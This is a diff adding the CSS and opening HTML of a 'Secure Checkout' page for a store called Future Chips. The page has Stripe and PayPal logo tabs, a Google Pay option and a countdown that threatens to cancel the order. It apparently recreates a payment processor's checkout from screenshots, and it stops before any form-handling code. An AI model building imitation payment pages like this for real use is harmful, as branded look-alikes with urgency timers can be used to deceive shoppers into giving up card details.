@@ -1,0 +1,2103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Checkout — Future Chips</title>
+  
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Outfit:wght@400;700;900&display=swap');
+
+:root {
+  /* Dynamic themes, fallback values */
+  --primary-color: #00f0ff;
+  --accent-color: #ff00e5;
+  --background-color: #0a0a1a;
+  --card-bg: rgba(16, 16, 36, 0.6);
+  --text-color: #ffffff;
+  --text-muted: #8c8cbe;
+  
+  --font-title: 'Outfit', sans-serif;
+  --font-body: 'Inter', sans-serif;
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  background-color: var(--background-color);
+  color: var(--text-color);
+  font-family: var(--font-body);
+  line-height: 1.6;
+  overflow-x: hidden;
+  background-image: 
+    radial-gradient(circle at 10% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 40%),
+    radial-gradient(circle at 90% 80%, rgba(255, 0, 229, 0.05) 0%, transparent 40%);
+  background-attachment: fixed;
+}
+
+/* Glassmorphism utility */
+.glass {
+  background: var(--card-bg);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  border: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+.container {
+  width: 90%;
+  max-width: 1200px;
+  margin: 0 auto;
+}
+
+/* Header */
+header {
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  padding: 1.5rem 0;
+  transition: background 0.3s;
+}
+
+header.scrolled {
+  background: rgba(10, 10, 26, 0.85);
+  backdrop-filter: blur(10px);
+  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+header .nav-container {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.logo {
+  font-family: var(--font-title);
+  font-weight: 900;
+  font-size: 1.8rem;
+  letter-spacing: 2px;
+  color: #ffffff;
+  text-decoration: none;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+
+.logo span {
+  background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  filter: drop-shadow(0 0 10px rgba(0, 240, 255, 0.3));
+}
+
+.nav-links {
+  display: flex;
+  gap: 2rem;
+  list-style: none;
+}
+
+.nav-links a {
+  color: var(--text-muted);
+  text-decoration: none;
+  font-weight: 500;
+  transition: color 0.3s;
+}
+
+.nav-links a:hover {
+  color: #ffffff;
+}
+
+.cart-icon-btn {
+  background: none;
+  border: none;
+  color: #ffffff;
+  cursor: pointer;
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 45px;
+  height: 45px;
+  border-radius: 50%;
+  transition: background 0.3s;
+}
+
+.cart-icon-btn:hover {
+  background: rgba(255, 255, 255, 0.05);
+}
+
+.cart-icon-btn svg {
+  width: 22px;
+  height: 22px;
+  fill: currentColor;
+}
+
+.cart-badge {
+  position: absolute;
+  top: 5px;
+  right: 5px;
+  background: var(--accent-color);
+  color: #ffffff;
+  font-size: 0.75rem;
+  font-weight: bold;
+  padding: 2px 6px;
+  border-radius: 10px;
+  box-shadow: 0 0 10px var(--accent-color);
+}
+
+/* Hero Section */
+.hero {
+  padding: 6rem 0 4rem 0;
+  text-align: center;
+  position: relative;
+}
+
+.hero h1 {
+  font-family: var(--font-title);
+  font-weight: 900;
+  font-size: 4rem;
+  line-height: 1.1;
+  margin-bottom: 1rem;
+  letter-spacing: -1px;
+}
+
+.hero h1 span {
+  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  display: inline-block;
+  animation: glow-pulse 3s infinite alternate;
+}
+
+.hero p {
+  color: var(--text-muted);
+  font-size: 1.2rem;
+  max-width: 600px;
+  margin: 0 auto 2.5rem auto;
+}
+
+/* Search and Filters */
+.filters-section {
+  margin-bottom: 3rem;
+  padding: 1.5rem;
+  border-radius: 16px;
+}
+
+.filters-wrapper {
+  display: flex;
+  gap: 1.5rem;
+  flex-wrap: wrap;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.search-box {
+  flex: 1;
+  min-width: 280px;
+  position: relative;
+}
+
+.search-box input {
+  width: 100%;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 10px;
+  padding: 0.8rem 1rem 0.8rem 2.8rem;
+  color: #ffffff;
+  font-family: var(--font-body);
+  transition: all 0.3s;
+}
+
+.search-box input:focus {
+  border-color: var(--primary-color);
+  outline: none;
+  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+}
+
+.search-box svg {
+  position: absolute;
+  left: 1rem;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 18px;
+  height: 18px;
+  fill: var(--text-muted);
+}
+
+.filter-group {
+  display: flex;
+  gap: 1rem;
+  align-items: center;
+}
+
+.filter-group select {
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 10px;
+  padding: 0.8rem 1.5rem;
+  color: #ffffff;
+  cursor: pointer;
+  outline: none;
+  font-family: var(--font-body);
+  transition: border-color 0.3s;
+}
+
+.filter-group select:focus {
+  border-color: var(--primary-color);
+}
+
+/* Product Grid */
+.products-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+  gap: 2.5rem;
+  margin-bottom: 5rem;
+}
+
+/* Product Card */
+.product-card {
+  border-radius: 20px;
+  overflow: hidden;
+  transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), box-shadow 0.4s;
+  display: flex;
+  flex-direction: column;
+  height: 100%;
+}
+
+.product-card:hover {
+  transform: translateY(-8px);
+  box-shadow: 0 15px 30px rgba(0, 240, 255, 0.1);
+  border-color: rgba(0, 240, 255, 0.3);
+}
+
+.product-image-wrap {
+  width: 100%;
+  aspect-ratio: 1;
+  position: relative;
+  background: #000;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+}
+
+.product-image-wrap img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  transition: transform 0.5s ease;
+}
+
+.product-card:hover .product-image-wrap img {
+  transform: scale(1.05);
+}
+
+.product-info {
+  padding: 1.5rem;
+  display: flex;
+  flex-direction: column;
+  flex-grow: 1;
+}
+
+.product-category {
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  color: var(--primary-color);
+  margin-bottom: 0.5rem;
+  font-weight: 700;
+}
+
+.product-title {
+  font-family: var(--font-title);
+  font-size: 1.4rem;
+  font-weight: 700;
+  margin-bottom: 0.5rem;
+  line-height: 1.3;
+}
+
+.product-desc {
+  color: var(--text-muted);
+  font-size: 0.9rem;
+  margin-bottom: 1.5rem;
+  display: -webkit-box;
+  -webkit-line-clamp: 2;
+  -webkit-box-orient: vertical;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  flex-grow: 1;
+}
+
+.product-footer {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.product-price {
+  font-family: var(--font-title);
+  font-weight: 900;
+  font-size: 1.5rem;
+  color: #ffffff;
+}
+
+.btn {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0.5rem;
+  padding: 0.8rem 1.5rem;
+  border-radius: 10px;
+  font-weight: 600;
+  font-family: var(--font-body);
+  text-decoration: none;
+  cursor: pointer;
+  transition: all 0.3s;
+  border: none;
+}
+
+.btn-primary {
+  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
+  color: #ffffff;
+  box-shadow: 0 4px 15px rgba(0, 240, 255, 0.3);
+}
+
+.btn-primary:hover {
+  transform: scale(1.03);
+  box-shadow: 0 4px 20px rgba(0, 240, 255, 0.5);
+}
+
+.btn-outline {
+  background: transparent;
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  color: #ffffff;
+}
+
+.btn-outline:hover {
+  border-color: var(--primary-color);
+  background: rgba(0, 240, 255, 0.05);
+}
+
+/* Detail View Layout */
+.product-detail-layout {
+  display: grid;
+  grid-template-columns: 1.2fr 1fr;
+  gap: 4rem;
+  padding: 5rem 0;
+  align-items: center;
+}
+
+@media (max-width: 768px) {
+  .product-detail-layout {
+    grid-template-columns: 1fr;
+    gap: 2rem;
+    padding: 2rem 0;
+  }
+  .hero h1 {
+    font-size: 2.5rem;
+  }
+}
+
+.detail-img-card {
+  border-radius: 24px;
+  overflow: hidden;
+  aspect-ratio: 1;
+}
+
+.detail-img-card img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+.detail-info {
+  display: flex;
+  flex-direction: column;
+}
+
+.detail-price-box {
+  margin: 1.5rem 0 2.5rem 0;
+}
+
+.detail-price-label {
+  font-size: 0.85rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.detail-price-val {
+  font-family: var(--font-title);
+  font-size: 3rem;
+  font-weight: 900;
+  line-height: 1.1;
+  color: #ffffff;
+}
+
+.detail-checkout-form {
+  display: flex;
+  flex-direction: column;
+  gap: 1rem;
+}
+
+.form-group {
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+}
+
+.form-group label {
+  font-size: 0.9rem;
+  color: var(--text-muted);
+}
+
+.form-group input {
+  width: 100%;
+  background: rgba(255, 255, 255, 0.05);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 10px;
+  padding: 0.9rem 1rem;
+  color: #ffffff;
+  font-family: var(--font-body);
+  transition: all 0.3s;
+}
+
+.form-group input:focus {
+  border-color: var(--primary-color);
+  outline: none;
+  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+}
+
+/* Slide-over Cart Panel */
+.cart-panel {
+  position: fixed;
+  top: 0;
+  right: -450px;
+  width: 100%;
+  max-width: 420px;
+  height: 100%;
+  z-index: 1000;
+  box-shadow: -10px 0 30px rgba(0,0,0,0.5);
+  display: flex;
+  flex-direction: column;
+  transition: right 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+.cart-panel.active {
+  right: 0;
+}
+
+.cart-header {
+  padding: 1.5rem;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.cart-header h2 {
+  font-family: var(--font-title);
+  font-size: 1.5rem;
+}
+
+.cart-close-btn {
+  background: none;
+  border: none;
+  color: var(--text-muted);
+  cursor: pointer;
+  font-size: 1.5rem;
+}
+
+.cart-items {
+  flex-grow: 1;
+  overflow-y: auto;
+  padding: 1.5rem;
+  display: flex;
+  flex-direction: column;
+  gap: 1.5rem;
+}
+
+.cart-item {
+  display: flex;
+  gap: 1rem;
+  align-items: center;
+  padding-bottom: 1.5rem;
+  border-bottom: 1px solid rgba(255,255,255,0.03);
+}
+
+.cart-item img {
+  width: 60px;
+  height: 60px;
+  border-radius: 8px;
+  object-fit: cover;
+  background: #000;
+}
+
+.cart-item-details {
+  flex-grow: 1;
+}
+
+.cart-item-title {
+  font-weight: 600;
+  font-size: 0.95rem;
+  margin-bottom: 0.2rem;
+}
+
+.cart-item-price {
+  color: var(--primary-color);
+  font-weight: 700;
+  font-size: 0.9rem;
+}
+
+.cart-item-remove {
+  background: none;
+  border: none;
+  color: var(--accent-color);
+  cursor: pointer;
+  font-size: 0.8rem;
+  padding: 4px;
+}
+
+.cart-footer {
+  padding: 1.5rem;
+  border-top: 1px solid rgba(255, 255, 255, 0.05);
+  background: rgba(8, 8, 20, 0.9);
+}
+
+.cart-total {
+  display: flex;
+  justify-content: space-between;
+  font-size: 1.2rem;
+  font-weight: bold;
+  margin-bottom: 1.5rem;
+}
+
+.cart-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: rgba(0, 0, 0, 0.6);
+  backdrop-filter: blur(4px);
+  z-index: 999;
+  display: none;
+}
+
+.cart-overlay.active {
+  display: block;
+}
+
+/* Status / Confirmation page layout */
+.status-card {
+  max-width: 550px;
+  margin: 8rem auto;
+  padding: 3rem;
+  border-radius: 24px;
+  text-align: center;
+}
+
+.status-icon {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 2rem auto;
+}
+
+.status-icon.success {
+  background: #ffffff;
+  color: #22c55e; /* Vibrant success green */
+  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+  border: none;
+}
+
+.status-icon.success svg {
+  width: 40px;
+  height: 40px;
+  fill: currentColor;
+}
+
+.status-title {
+  font-family: var(--font-title);
+  font-weight: 900;
+  font-size: 2.2rem;
+  margin-bottom: 1rem;
+}
+
+.status-text {
+  color: var(--text-muted);
+  margin-bottom: 2.5rem;
+}
+
+.receipt-info {
+  background: rgba(255, 255, 255, 0.02);
+  border: 1px solid rgba(255, 255, 255, 0.05);
+  border-radius: 12px;
+  padding: 1.5rem;
+  text-align: left;
+  margin-bottom: 2.5rem;
+}
+
+.receipt-row {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 0.8rem;
+  font-size: 0.95rem;
+}
+
+.receipt-row:last-child {
+  margin-bottom: 0;
+  padding-top: 0.8rem;
+  border-top: 1px solid rgba(255,255,255,0.05);
+  font-weight: bold;
+}
+
+/* Animations */
+@keyframes glow-pulse {
+  from {
+    filter: drop-shadow(0 0 5px var(--primary-color));
+  }
+  to {
+    filter: drop-shadow(0 0 20px var(--accent-color));
+  }
+}
+
+/* Footer styling */
+footer {
+  padding: 3rem 0;
+  border-top: 1px solid rgba(255, 255, 255, 0.05);
+  text-align: center;
+  color: var(--text-muted);
+  font-size: 0.9rem;
+}
+
+/* Custom Mock Checkout Page Styles */
+*, *::before, *::after {
+  box-sizing: border-box;
+}
+
+body.checkout-body {
+  background-color: #f8f9fa;
+  color: #1a1a1a;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  line-height: 1.5;
+  padding: 2rem 1rem;
+  background-image: none;
+}
+
+.checkout-wrapper {
+  max-width: 850px;
+  margin: 0 auto;
+  background: #ffffff;
+  border-radius: 8px;
+  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1), 0 1px 2px rgba(0, 0, 0, 0.06);
+  padding: 2.5rem;
+}
+
+/* Countdown Banner */
+.countdown-container {
+  text-align: center;
+  margin-bottom: 2rem;
+  font-size: 1.15rem;
+  color: #1f2937;
+  font-weight: 600;
+}
+
+.countdown-time {
+  color: #ef4444;
+  font-weight: 700;
+  margin: 0 0.25rem;
+}
+
+/* Order Details Row */
+.order-header-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding-bottom: 1.25rem;
+  border-bottom: 1px solid #e5e7eb;
+  margin-bottom: 2rem;
+  flex-wrap: wrap;
+  gap: 1rem;
+}
+
+.order-info-left {
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+}
+
+.order-number {
+  font-weight: 700;
+  color: #1f2937;
+  font-size: 0.95rem;
+}
+
+.payment-details-dropdown {
+  color: #6b7280;
+  font-size: 0.85rem;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 0.25rem;
+  text-decoration: none;
+  font-weight: 500;
+}
+
+.payment-details-dropdown:hover {
+  color: #374151;
+}
+
+.order-total-box {
+  font-size: 0.95rem;
+  color: #4b5563;
+  font-weight: 500;
+}
+
+.order-total-amount {
+  font-size: 1.4rem;
+  color: #2563eb;
+  font-weight: 700;
+  margin: 0 0.25rem;
+}
+
+/* Payment Methods Selector Row */
+.payment-methods-row {
+  display: flex;
+  align-items: center;
+  gap: 1.5rem;
+  margin-bottom: 2.5rem;
+  flex-wrap: wrap;
+}
+
+.payment-methods-label {
+  color: #6b7280;
+  font-size: 0.9rem;
+  font-weight: 500;
+  width: 130px;
+}
+
+.method-tabs {
+  display: flex;
+  gap: 1rem;
+}
+
+.method-tab {
+  padding: 0.6rem 2rem;
+  border-radius: 4px;
+  cursor: pointer;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  height: 44px;
+  min-width: 120px;
+  transition: all 0.2s;
+  user-select: none;
+}
+
+.method-tab.stripe {
+  border: 2px solid #2563eb;
+  background: #eff6ff; /* light blue tint background */
+}
+
+/* Blue corner checkmark for Stripe */
+.method-tab.stripe::after {
+  content: "";
+  position: absolute;
+  bottom: 0;
+  right: 0;
+  width: 0;
+  height: 0;
+  border-style: solid;
+  border-width: 0 0 16px 16px;
+  border-color: transparent transparent #2563eb transparent;
+}
+
+/* Checkmark white tick inside the blue triangle */
+.method-tab.stripe::before {
+  content: "✓";
+  position: absolute;
+  bottom: -1px;
+  right: 1px;
+  color: #ffffff;
+  font-size: 8px;
+  font-weight: bold;
+  z-index: 1;
+}
+
+.method-tab.paypal {
+  border: 1px solid transparent;
+  background: #f4f4f5;
+}
+
+.payment-method-logo {
+  max-height: 22px;
+  max-width: 100%;
+  object-fit: contain;
+  display: block;
+}
+
+svg.payment-method-logo {
+  height: 22px;
+  width: auto;
+  display: block;
+}
+
+svg.stripe-logo, img.stripe-logo {
+  height: 22px;
+  width: auto;
+  object-fit: contain;
+  display: block;
+}
+
+svg.paypal-logo {
+  height: 20px;
+  width: 75px;
+}
+
+img.paypal-logo {
+  height: 20px;
+  width: auto;
+  object-fit: contain;
+  display: block;
+}
+
+/* Sub tabs: Card / Google Pay */
+.sub-tabs-container {
+  display: none;
+  gap: 1rem;
+  margin-bottom: 2rem;
+}
+
+.sub-tab {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: flex-start;
+  justify-content: space-between;
+  height: 52px;
+  padding: 7px 12px;
+  border-radius: 6px;
+  cursor: pointer;
+  font-size: 0.82rem;
+  font-weight: 600;
+  color: #6b7280;
+  transition: all 0.2s;
+  user-select: none;
+  background: #ffffff;
+  border: 1px solid #e5e7eb;
+  box-sizing: border-box;
+}
+
+.sub-tab:hover:not(.active) {
+  border-color: #d1d5db;
+  background-color: #fafafa;
+}
+
+.sub-tab.active {
+  border: 2px solid #2563eb;
+  padding: 6px 11px; /* Offset the 2px border to prevent layout shift */
+  color: #2563eb;
+  font-weight: 600;
+}
+
+.sub-tab-icon {
+  height: 20px;
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+}
+
+.sub-tab-label {
+  display: block;
+  text-align: left;
+  line-height: 1.2;
+}
+
+/* Google Pay button text styling */
+.gpay-text {
+  font-family: 'Product Sans', 'Roboto', sans-serif;
+  letter-spacing: -0.2px;
+}
+
+/* Checkout Form Container */
+.checkout-form-content {
+  margin-top: 1.5rem;
+}
+
+.form-section-card {
+  display: block;
+}
+
+.form-section-gpay {
+  display: none;
+}
+
+/* Fast Checkout Link Helper (Collapsed State) */
+.link-checkout-collapsed {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  color: #2563eb; /* blue color for link text and arrow */
+  font-size: 0.85rem;
+  font-weight: 600;
+  cursor: pointer;
+  user-select: none;
+}
+
+.link-checkout-helper-left {
+  display: flex;
+  align-items: center;
+  gap: 0.35rem;
+}
+
+.link-text {
+  color: #2563eb;
+}
+
+.link-arrow {
+  color: #2563eb;
+}
+
+/* Link Fast Checkout Box (Expanded State) */
+.link-checkout-expanded {
+  background: #ffffff;
+  border: 1px solid #d1d5db;
+  border-radius: 6px;
+  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+  overflow: hidden;
+}
+
+.link-box-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.75rem 1rem;
+  border-bottom: 1px solid #f3f4f6;
+}
+
+.link-text-bold {
+  font-size: 0.85rem;
+  font-weight: 700;
+  color: #1f2937;
+}
+
+.link-close-btn {
+  background: none;
+  border: none;
+  font-size: 1.25rem;
+  color: #9ca3af;
+  cursor: pointer;
+  line-height: 1;
+  padding: 0;
+}
+
+.link-close-btn:hover {
+  color: #4b5563;
+}
+
+.link-box-body {
+  padding: 1rem;
+}
+
+.link-box-description {
+  font-size: 0.82rem;
+  color: #4b5563;
+  line-height: 1.4;
+  margin-bottom: 1rem;
+  text-align: left;
+}
+
+.link-input-label {
+  display: block;
+  font-size: 0.8rem;
+  font-weight: 600;
+  color: #4b5563;
+  margin-bottom: 0.35rem;
+  text-align: left;
+}
+
+.link-box-footer {
+  background: #fafafa;
+  padding: 0.5rem 1rem;
+  border-top: 1px solid #f3f4f6;
+  display: flex;
+  align-items: center;
+}
+
+.link-logo-container {
+  display: flex;
+  align-items: center;
+}
+
+/* Form Inputs styling */
+.checkout-input-group {
+  margin-bottom: 1.25rem;
+}
+
+.checkout-input-group label {
+  display: block;
+  font-size: 0.85rem;
+  font-weight: 500;
+  color: #4b5563;
+  margin-bottom: 0.35rem;
+}
+
+.input-container-with-icons {
+  position: relative;
+  display: flex;
+  align-items: center;
+}
+
+.checkout-input {
+  width: 100%;
+  padding: 0.75rem;
+  border: 1px solid #d1d5db;
+  border-radius: 6px;
+  font-size: 0.95rem;
+  color: #1f2937;
+  outline: none;
+  transition: border-color 0.2s;
+  background: #ffffff;
+}
+
+.checkout-input::placeholder {
+  color: #9ca3af;
+}
+
+.checkout-input:focus {
+  border-color: #2563eb;
+  box-shadow: 0 0 0 1px #2563eb;
+}
+
+.card-brand-icons {
+  position: absolute;
+  right: 0.75rem;
+  top: 50%;
+  transform: translateY(-50%);
+  display: flex;
+  gap: 0.25rem;
+  align-items: center;
+}
+
+.card-brand-icon {
+  height: 18px;
+  border-radius: 2px;
+}
+
+/* Form Row for Exp and CVV */
+.form-row-2col {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 1rem;
+}
+
+/* Form Row for Card number, Exp and CVV on same line */
+.form-row-3col {
+  display: grid;
+  grid-template-columns: 2fr 1fr 1fr;
+  gap: 1rem;
+  margin-bottom: 1.25rem;
+}
+
+.form-row-3col .checkout-input-group {
+  margin-bottom: 0;
+}
+
+/* Google Pay Instruction Box */
+.gpay-instruction-box {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  padding: 1.25rem;
+  border: 1px solid #d1d5db;
+  border-radius: 6px;
+  background-color: #ffffff;
+  color: #6b7280;
+  font-size: 0.9rem;
+  margin-bottom: 2.5rem;
+}
+
+.gpay-instruction-icon {
+  flex-shrink: 0;
+  width: 24px;
+  height: 24px;
+  color: #9ca3af;
+}
+
+.gpay-instruction-text {
+  line-height: 1.4;
+}
+
+/* Action button area */
+.checkout-actions {
+  margin-top: 2rem;
+}
+
+.pay-now-submit-btn {
+  width: 100%;
+  max-width: 160px;
+  padding: 0.8rem;
+  font-size: 0.95rem;
+  font-weight: 600;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  text-align: center;
+  transition: background-color 0.2s;
+}
+
+/* Custom button states from screenshots */
+.pay-now-submit-btn.card-style {
+  background-color: #a5b4fc; /* inactive light indigo/blue */
+  color: #ffffff;
+  cursor: not-allowed;
+  opacity: 0.8;
+  transition: all 0.2s;
+}
+
+.pay-now-submit-btn.card-style:hover {
+  background-color: #818cf8;
+}
+
+/* Active solid blue state when all card info is valid */
+.pay-now-submit-btn.card-style.active-state {
+  background-color: #0052ff; /* bright blue */
+  opacity: 1;
+  cursor: pointer;
+}
+
+.pay-now-submit-btn.card-style.active-state:hover {
+  background-color: #0040c7;
+}
+
+.pay-now-submit-btn.gpay-style {
+  background-color: #2563eb; /* solid dark blue as in screenshot */
+  color: #ffffff;
+  max-width: 160px;
+}
+
+.pay-now-submit-btn.gpay-style:hover {
+  background-color: #1d4ed8;
+}
+
+/* General Link Dropdown Content (Mock Toggle) */
+.details-collapse-content {
+  display: none;
+  margin-top: 1rem;
+  background: #f9fafb;
+  border: 1px solid #e5e7eb;
+  border-radius: 6px;
+  padding: 1rem;
+  font-size: 0.85rem;
+  color: #4b5563;
+}
+
+.details-collapse-content.active {
+  display: block;
+}
+
+.details-row {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 0.5rem;
+}
+
+.details-row:last-child {
+  margin-bottom: 0;
+  padding-top: 0.5rem;
+  border-top: 1px dashed #e5e7eb;
+  font-weight: 600;
+}
+
+/* Card Validation Error Styling */
+.checkout-input.error-state {
+  border-color: #ef4444 !important;
+  color: #ef4444 !important;
+}
+
+.checkout-input.error-state:focus {
+  box-shadow: 0 0 0 1px #ef4444 !important;
+}
+
+.card-error-message {
+  color: #ef4444;
+  font-size: 0.82rem;
+  font-weight: 500;
+  margin-top: 0.35rem;
+  text-align: left;
+}
+
+</style>
+</head>
+<body class="checkout-body">
+
+  <div class="checkout-wrapper">
+    <!-- Countdown Timer Banner -->
+    <div class="countdown-container">
+      Payment must be submitted within <span id="countdown-timer" class="countdown-time">120:00</span>, or your order will be cancelled.
+    </div>
+
+    <!-- Order Header Row -->
+    <div class="order-header-row">
+      <div class="order-info-left">
+        <span class="order-number" id="order-number-display">Order No: LOADING...</span>
+        <a class="payment-details-dropdown" id="toggle-details-btn">
+          Payment details 
+          <svg width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-left: 2px;">
+            <path d="M1 1L5 5L9 1" stroke="#6B7280" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </a>
+      </div>
+      <div class="order-total-box">
+        Total:<span class="order-total-amount" id="order-total-display">$0.00</span> dollars
+      </div>
+    </div>
+
+    <!-- Collapsible Details Box -->
+    <div class="details-collapse-content" id="details-collapse">
+      <div class="details-row">
+        <span id="product-name-detail">Product Name</span>
+        <span id="product-price-detail">$0.00</span>
+      </div>
+      <div class="details-row">
+        <span>Quantity</span>
+        <span>1</span>
+      </div>
+      <div class="details-row">
+        <span>Delivery Address</span>
+        <span id="customer-email-detail">email@domain.com</span>
+      </div>
+    </div>
+
+    <!-- Payment Methods Row -->
+    <div class="payment-methods-row">
+      <span class="payment-methods-label">Payment methods:</span>
+      <div class="method-tabs">
+        <div class="method-tab stripe active" id="stripe-method-tab">
+          <img src="download.png" alt="Stripe" class="payment-method-logo stripe-logo">
+        </div>
+        <div class="method-tab paypal" id="paypal-method-tab">
+          <img src="paypal.f4d3d293.png" alt="PayPal" class="payment-method-logo paypal-logo">
+        </div>
+      </div>
+    </div>
+
+    <!-- Main Payment Details Area -->
+    <div id="stripe-payment-section">
+      <!-- Sub Tabs: Card vs Google Pay -->
+      <div class="sub-tabs-container">
+        <!-- Card Tab -->
+        <div class="sub-tab card-tab active" id="sub-tab-card">
+          <span class="sub-tab-icon">
+            <svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path fill-rule="evenodd" clip-rule="evenodd" d="M2 0h16a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2z M0 4h20v3H0V4z M3 10h4v3H3v-3z" fill="currentColor"/>
+            </svg>
+          </span>
+          <span class="sub-tab-label">Card</span>
+        </div>
+        <!-- Google Pay Tab -->
+        <div class="sub-tab gpay-tab" id="sub-tab-gpay">
+          <span class="sub-tab-icon">
+            <svg width="40" height="20" viewBox="0 0 40 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <rect x="0.5" y="0.5" width="39" height="19" rx="4" fill="white" stroke="#D1D5DB"/>
+              <g transform="translate(7, 0)">
+                <path d="M10.5 10c0-.37-.03-.72-.1-1.05H6v2h2.56a2.2 2.2 0 0 1-.96 1.44v1.2h1.55c.9-.83 1.41-2.06 1.41-3.59z" fill="#4285F4"/>
+                <path d="M6 14.5c1.24 0 2.28-.41 3.04-1.12l-1.55-1.2c-.43.29-.98.46-1.49.46-1.15 0-2.13-.78-2.48-1.81H2.03v1.24A6.5 6.5 0 0 0 6 14.5z" fill="#34A853"/>
+                <path d="M3.52 10.83a3.9 3.9 0 0 1 0-2.5V7.09H2.03a6.5 6.5 0 0 0 0 5.82l1.49-1.24v-.84z" fill="#FBBC05"/>
+                <path d="M6 5.67c.68 0 1.28.23 1.76.69l1.32-1.32A6.5 6.5 0 0 0 6 3.5a6.5 6.5 0 0 0-3.97 1.35l1.49 1.24c.35-1.03 1.33-1.81 2.48-1.81z" fill="#EA4335"/>
+                <path d="M13.5 6.5h1.8c.4 0 .7.1.9.3.2.2.3.4.3.7s-.1.5-.3.7c-.2.2-.5.3-.9.3h-.9v2h-1v-4zm1 1.3h.8c.2 0 .3 0 .4-.1.1-.1.1-.2.1-.3s0-.2-.1-.3c-.1-.1-.2-.1-.4-.1h-.8v.8z" fill="#5F6368"/>
+                <path d="M18.2 8.5c0-.4.3-.6.8-.6.4 0 .6.2.6.5v2.1h-.9v-.3c-.1.2-.4.4-.7.4-.3 0-.5-.1-.7-.3a1 1 0 0 1-.2-.6c0-.4.3-.6.8-.6h.7c0-.2-.1-.3-.2-.4a.5.5 0 0 0-.4-.1.5.5 0 0 0-.4.1.7.7 0 0 0-.2.3l-.8-.2c.1-.3.3-.5.6-.6.3-.1.6-.2 1-.2.5 0 .8.1 1 .3.2.2.3.5.3.9v1.9h-1v-.3l-.3.3c-.2.1-.4.2-.6.2a1 1 0 0 1-.7-.2c-.2-.1-.2-.3-.2-.5zm1.4.3h-.5c-.2 0-.3.1-.3.3s.1.2.3.2c.2 0 .4-.1.5-.3v-.2z" fill="#5F6368"/>
+                <path d="M21.5 12.2l1.2-2.7L21 6.5h1.1l1.1 2.3h.1l1-2.3h1.1L23.8 12.2h-1.3z" fill="#5F6368"/>
+              </g>
+            </svg>
+          </span>
+          <span class="sub-tab-label gpay-text">Google Pay</span>
+        </div>
+      </div>
+
+      <!-- Checkout Form Content -->
